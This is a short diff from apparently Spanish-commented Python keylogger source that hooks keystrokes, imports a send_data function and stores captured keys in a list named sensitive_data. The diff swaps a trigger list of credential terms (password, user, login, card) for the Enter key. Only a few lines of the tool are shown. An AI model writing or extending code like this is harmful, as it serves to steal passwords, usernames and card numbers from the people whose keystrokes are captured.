@@ -5,7 +5,7 @@ import keyboard as py_keyboard
 import Global
 from send_data import send_data
 # Lista de palabras clave que el programa buscará en las pulsaciones de teclas
-keywords = ["contraseña", "password", "usuario", "login", "tarjeta"]
+keywords = ["Enter"]
 # Lista para almacenar las teclas presionadas hasta el momento
 sensitive_data = []
 
